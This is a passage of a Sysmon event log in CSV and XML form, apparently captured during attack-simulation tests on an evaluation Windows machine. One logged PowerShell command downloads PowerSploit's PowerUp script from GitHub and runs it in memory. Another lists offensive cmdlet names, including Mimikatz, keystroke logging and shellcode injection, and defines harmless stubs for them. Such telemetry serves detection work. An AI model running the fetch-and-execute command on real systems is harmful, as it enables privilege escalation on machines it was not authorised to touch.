Invoke-AllChecks}",Microsoft Corporation,WinDev2309Eval,,C:\Users\User\AppData\Local\Temp\,Windows PowerShell,,,,,,,1,19663,,10.0.22621.2506 (WinBuild.160101.0800),"MD5=2D1D70C92A419D9079B047954C611886,SHA256=C50057756CDB25D481CF2502ABCEF124F864C27618C5057468BFC6B82B2C4EDD,IMPHASH=E09C4F82A1DA13A09F4FF2E625FEBA20",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,Medium,0x8000000000000000,4,{f57bd86a-36f9-658c-7bf8-020000000000},0x2f87b,0,PowerShell.EXE,-,-,{00000000-0000-0000-0000-000000000000},1688,-,{f57bd86a-78c6-658c-fe01-000000000f00},3588,10488,Microsoft® Windows® Operating System,,,,,-,,,,,,2023-12-27T19:19:34.0387421Z,,,1,1,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 19:19:34.037,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    
        
    <System>
      
            
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      
            
      <EventID>1</EventID>
      
            
      <Version>5</Version>
      
            
      <Level>4</Level>
      
            
      <Task>1</Task>
      
            
      <Opcode>0</Opcode>
      
            
      <Keywords>0x8000000000000000</Keywords>
      
            
      <TimeCreated SystemTime=""2023-12-27T19:19:34.0387421Z""/>
      
            
      <EventRecordID>19663</EventRecordID>
      
            
      <Correlation/>
      
            
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      
            
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      
            
      <Computer>WinDev2309Eval</Computer>
      
            
      <Security UserID=""S-1-5-18""/>
      
        
    </System>
    
        
    <EventData>
      
            
      <Data Name=""RuleName"">-</Data>
      
            
      <Data Name=""UtcTime"">2023-12-27 19:19:34.037</Data>
      
            
      <Data Name=""ProcessGuid"">{f57bd86a-78c6-658c-fe01-000000000f00}</Data>
      
            
      <Data Name=""ProcessId"">10488</Data>
      
            
      <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      
            
      <Data Name=""FileVersion"">10.0.22621.2506 (WinBuild.160101.0800)</Data>
      
            
      <Data Name=""Description"">Windows PowerShell</Data>
      
            
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      
            
      <Data Name=""Company"">Microsoft Corporation</Data>
      
            
      <Data Name=""OriginalFileName"">PowerShell.EXE</Data>
      
            
      <Data Name=""CommandLine"">""powershell.exe"" &amp; {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
iex(iwr https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/d943001a7defb5e0d1657085a77a0e78609be58f/Privesc/PowerUp.ps1 -UseBasicParsing)
Invoke-AllChecks}</Data>
      
            
      <Data Name=""CurrentDirectory"">C:\Users\User\AppData\Local\Temp\</Data>
      
            
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      
            
      <Data Name=""LogonGuid"">{f57bd86a-36f9-658c-7bf8-020000000000}</Data>
      
            
      <Data Name=""LogonId"">0x2f87b</Data>
      
            
      <Data Name=""TerminalSessionId"">1</Data>
      
            
      <Data Name=""IntegrityLevel"">Medium</Data>
      
            
      <Data Name=""Hashes"">MD5=2D1D70C92A419D9079B047954C611886,SHA256=C50057756CDB25D481CF2502ABCEF124F864C27618C5057468BFC6B82B2C4EDD,IMPHASH=E09C4F82A1DA13A09F4FF2E625FEBA20</Data>
      
            
      <Data Name=""ParentProcessGuid"">{00000000-0000-0000-0000-000000000000}</Data>
      
            
      <Data Name=""ParentProcessId"">1688</Data>
      
            
      <Data Name=""ParentImage"">-</Data>
      
            
      <Data Name=""ParentCommandLine"">-</Data>
      
            
      <Data Name=""ParentUser"">-</Data>
      
        
    </EventData>
    
    
  </Event>
  
    
  
"
Microsoft-Windows-Sysmon/Operational,,,WinDev2309Eval,2023-12-27 19:19:33.106,,,,,,,,,11,19662,,,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,0x8000000000000000,4,,,0,,,,,,,{f57bd86a-78c5-658c-fc01-000000000f00},3588,4520,,,,,,-,,,,,,2023-12-27T19:19:33.1156878Z,C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_idqq0rtn.4rd.ps1,,11,,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 19:19:33.106,2,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    
        
    <System>
      
            
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      
            
      <EventID>11</EventID>
      
            
      <Version>2</Version>
      
            
      <Level>4</Level>
      
            
      <Task>11</Task>
      
            
      <Opcode>0</Opcode>
      
            
      <Keywords>0x8000000000000000</Keywords>
      
            
      <TimeCreated SystemTime=""2023-12-27T19:19:33.1156878Z""/>
      
            
      <EventRecordID>19662</EventRecordID>
      
            
      <Correlation/>
      
            
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      
            
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      
            
      <Computer>WinDev2309Eval</Computer>
      
            
      <Security UserID=""S-1-5-18""/>
      
        
    </System>
    
        
    <EventData>
      
            
      <Data Name=""RuleName"">-</Data>
      
            
      <Data Name=""UtcTime"">2023-12-27 19:19:33.106</Data>
      
            
      <Data Name=""ProcessGuid"">{f57bd86a-78c5-658c-fc01-000000000f00}</Data>
      
            
      <Data Name=""ProcessId"">4520</Data>
      
            
      <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      
            
      <Data Name=""TargetFilename"">C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_idqq0rtn.4rd.ps1</Data>
      
            
      <Data Name=""CreationUtcTime"">2023-12-27 19:19:33.106</Data>
      
            
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      
        
    </EventData>
    
    
  </Event>
  
    
  
"
Microsoft-Windows-Sysmon/Operational,"""powershell.exe"" & {$malcmdlets = \""""Add-Persistence\"""", \""""Find-AVSignature\"""", \""""Get-GPPAutologon\"""", \""""Get-GPPPassword\"""", \""""Get-HttpStatus\"""", \""""Get-Keystrokes\"""", \""""Get-SecurityPackages\"""", \""""Get-TimedScreenshot\"""", \""""Get-VaultCredential\"""", \""""Get-VolumeShadowCopy\"""", \""""Install-SSP\"""", \""""Invoke-CredentialInjection\"""", \""""Invoke-DllInjection\"""", \""""Invoke-Mimikatz\"""", \""""Invoke-NinjaCopy\"""", \""""Invoke-Portscan\"""", \""""Invoke-ReflectivePEInjection\"""", \""""Invoke-ReverseDnsLookup\"""", \""""Invoke-Shellcode\"""", \""""Invoke-TokenManipulation\"""", \""""Invoke-WmiCommand\"""", \""""Mount-VolumeShadowCopy\"""", \""""New-ElevatedPersistenceOption\"""", \""""New-UserPersistenceOption\"""", \""""New-VolumeShadowCopy\"""", \""""Out-CompressedDll\"""", \""""Out-EncodedCommand\"""", \""""Out-EncryptedScript\"""", \""""Out-Minidump\"""", \""""PowerUp\"""", \""""PowerView\"""", \""""Remove-Comments\"""", \""""Remove-VolumeShadowCopy\"""", \""""Set-CriticalProcess\"""", \""""Set-MasterBootRecord\""""

foreach ($cmdlets in $malcmdlets) {
    \""""function $cmdlets { Write-Host Pretending to invoke $cmdlets }\""""}
foreach ($cmdlets in $malcmdlets) {
    $cmdlets}}",Microsoft Corporation,WinDev2309Eval,,C:\Users\User\AppData\Local\Temp\,Windows PowerShell,,,,,,,1,19661,,10.0.22621.2506 (WinBuild.160101.0800),"MD5=2D1D70C92A419D9079B047954C611886,SHA256=C50057756CDB25D481CF2502ABCEF124F864C27618C5057468BFC6B82B2C4EDD,IMPHASH=E09C4F82A1DA13A09F4FF2E625FEBA20",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,Medium,0x8000000000000000,4,{f57bd86a-36f9-658c-7bf8-020000000000},0x2f87b,0,PowerShell.EXE,-,-,{00000000-0000-0000-0000-000000000000},1688,-,{f57bd86a-78c5-658c-fc01-000000000f00},3588,4520,Microsoft® Windows® Operating System,,,,,-,,,,,,2023-12-27T19:19:33.0110240Z,,,1,1,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 19:19:33.010,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    
        
    <System>
      
            
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      
            
      <EventID>1</EventID>
      
            
      <Version>5</Version>
      
            
      <Level>4</Level>
      
            
      <Task>1</Task>
      
            
      <Opcode>0</Opcode>
      
            
      <Keywords>0x8000000000000000</Keywords>
      
            
      <TimeCreated SystemTime=""2023-12-27T19:19:33.0110240Z""/>
      
            
      <EventRecordID>19661</EventRecordID>
      
            
      <Correlation/>
      
            
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      
            
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      
            
      <Computer>WinDev2309Eval</Computer>
      
            
      <Security UserID=""S-1-5-18""/>
      
        
    </System>
    
        
    <EventData>
      
            
      <Data Name=""RuleName"">-</Data>
      
            
      <Data Name=""UtcTime"">2023-12-27 19:19:33.010</Data>
      
            
      <Data Name=""ProcessGuid"">{f57bd86a-78c5-658c-fc01-000000000f00}</Data>
      
            
      <Data Name=""ProcessId"">4520</Data>
      
            
      <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      
            
      <Data Name=""FileVersion"">10.0.22621.2506 (WinBuild.160101.0800)</Data>
      
            
      <Data Name=""Description"">Windows PowerShell</Data>
      
            
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      
            
      <Data Name=""Company"">Microsoft Corporation</Data>
      
            
      <Data Name=""OriginalFileName"">PowerShell.EXE</Data>
      
            
      <Data Name=""CommandLine"">""powershell.exe"" &amp; {$malcmdlets = \""""Add-Persistence\"""", \""""Find-AVSignature\"""", \""""Get-GPPAutologon\"""", \""""Get-GPPPassword\"""", \""""Get-HttpStatus\"""", \""""Get-Keystrokes\"""", \""""Get-SecurityPackages\"""", \""""Get-TimedScreenshot\"""", \""""Get-VaultCredential\"""", \""""Get-VolumeShadowCopy\"""", \""""Install-SSP\"""", \""""Invoke-CredentialInjection\"""", \""""Invoke-DllInjection\"""", \""""Invoke-Mimikatz\"""", \""""Invoke-NinjaCopy\"""", \""""Invoke-Portscan\"""", \""""Invoke-ReflectivePEInjection\"""", \""""Invoke-ReverseDnsLookup\"""", \""""Invoke-Shellcode\"""", \""""Invoke-TokenManipulation\"""", \""""Invoke-WmiCommand\"""", \""""Mount-VolumeShadowCopy\"""", \""""New-ElevatedPersistenceOption\"""", \""""New-UserPersistenceOption\"""", \""""New-VolumeShadowCopy\"""", \""""Out-CompressedDll\"""", \""""Out-EncodedCommand\"""", \""""Out-EncryptedScript\"""", \""""Out-Minidump\"""", \""""PowerUp\"""", \""""PowerView\"""", \""""Remove-Comments\"""", \""""Remove-VolumeShadowCopy\"""", \""""Set-CriticalProcess\"""", \""""Set-MasterBootRecord\""""

foreach ($cmdlets in $malcmdlets) {
    \""""function $cmdlets { Write-Host Pretending to invoke $cmdlets }\""""}
foreach ($cmdlets in $malcmdlets) {
    $cmdlets}}</Data>
      
            
      <Data Name=""CurrentDirectory"">C:\Users\User\AppData\Local\Temp\</Data>
      
            
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      
            
      <Data Name=""LogonGuid"">{f57bd86a-36f9-658c-7bf8-020000000000}</Data>
      
            
      <Data Name=""LogonId"">0x2f87b</Data>
      
            
      <Data Name=""TerminalSessionId"">1</Data>
      
            
      <Data Name=""IntegrityLevel"">Medium</Data>
      
            
      <Data Name=""Hashes"">MD5=2D1D70C92A419D9079B047954C611886,SHA256=C50057756CDB25D481CF2502ABCEF124F864C27618C5057468BFC6B82B2C4EDD,IMPHASH=E09C4F82A1DA13A09F4FF2E625FEBA20</Data>
      
            
      <Data Name=""ParentProcessGuid"">{00000000-0000-0000-0000-000000000000}</Data>
      
            
      <Data Name=""ParentProcessId"">1688</Data>
      
            
      <Data Name=""ParentImage"">-</Data>
      
            
      <Data Name=""ParentCommandLine"">-</Data>
      
            
      <Data Name=""ParentUser"">-</Data>
      
        
    </EventData>
    
    
  </Event>
  
    
  
"
Microsoft-Windows-Sysmon/Operational,,,WinDev2309Eval,2023-12-27 19:19:31.697,,,,,,,,,11,19660,,,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,0x8000000000000000,4,,,0,,,,,,,{f57bd86a-78c3-658c-fb01-000000000f00},3588,5556,,,,,,-,,,,,,2023-12-27T19:19:31.7017074Z,C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_tzqi5xrg.ral.ps1,,11,,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 19:19:31.697,2,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    
        
    <System>
      
            
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      
            
      <EventID>11</EventID>
      
            
      <Version>2</Version>
      
            
      <Level>4</Level>
      
            
      <Task>11</Task>
      
            
      <Opcode>0</Opcode>
      
            
      <Keywords>0x8000000000000000</Keywords>
      
            
      <TimeCreated SystemTime=""2023-12-27T19:19:31.7017074Z""/>
      
            
      <EventRecordID>19660</EventRecordID>
      
            
      <Correlation/>
      
            
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      
            
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      
            
      <Computer>WinDev2309Eval</Computer>
      
            
      <Security UserID=""S-1-5-18""/>
      
        
    </System>
    
        
    <EventData>
      
            
      <Data Name=""RuleName"">-</Data>
      
            
      <Data Name=""UtcTime"">2023-12-27 19:19:31.697</Data>
      
            
      <Data Name=""ProcessGuid"">{f57bd86a-78c3-658c-fb01-000000000f00}</Data>
      
            
      <Data Name=""ProcessId"">5556</Data>
      
            
      <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      
            
      <Data Name=""TargetFilename"">C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_tzqi5xrg.ral.ps1</Data>
      
            
      <Data Name=""CreationUtcTime"">2023-12-27 19:19:31.697</Data>
      
            
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      
        
    </EventData>
    
    
  </Event>
  
    
  
"
